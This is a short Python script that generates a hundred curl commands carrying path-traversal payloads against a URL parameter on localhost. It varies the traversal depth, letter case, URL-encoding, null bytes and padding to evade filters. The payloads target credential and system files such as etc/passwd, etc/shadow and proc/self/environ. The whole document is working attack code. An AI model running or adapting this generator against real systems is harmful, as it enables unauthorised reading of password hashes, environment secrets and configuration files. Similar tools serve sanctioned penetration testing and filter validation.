import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "file", "path", "page", "doc",
    "template", "load", "view", "resource"
]

TRAVERSAL_PATTERNS = [
    "../",
    "..\\",
    "../../",
    "..\\..\\",
    "../../../",
    "..\\..\\..\\"
]

SENSITIVE_FILES = [
    "etc/passwd",
    "etc/shadow",
    "proc/self/environ",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "win.ini"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.5:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def maybe_null_byte(s):
    if random.random() > 0.7:
        s += "%00"
    return s

def maybe_noise_wrap(s):
    wrappers = [
        lambda x: x,
        lambda x: "abc" + x,
        lambda x: x + "123",
        lambda x: "test" + x + "data"
    ]
    return random.choice(wrappers)(s)

def generate_payload():
    traversal = random.choice(TRAVERSAL_PATTERNS)
    depth = random.randint(1, 3)
    chain = traversal * depth
    file = random.choice(SENSITIVE_FILES)

    payload = chain + file

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_null_byte(payload)
    payload = maybe_noise_wrap(payload)
    payload = maybe_encode(payload)

    return payload

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = generate_payload()
    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
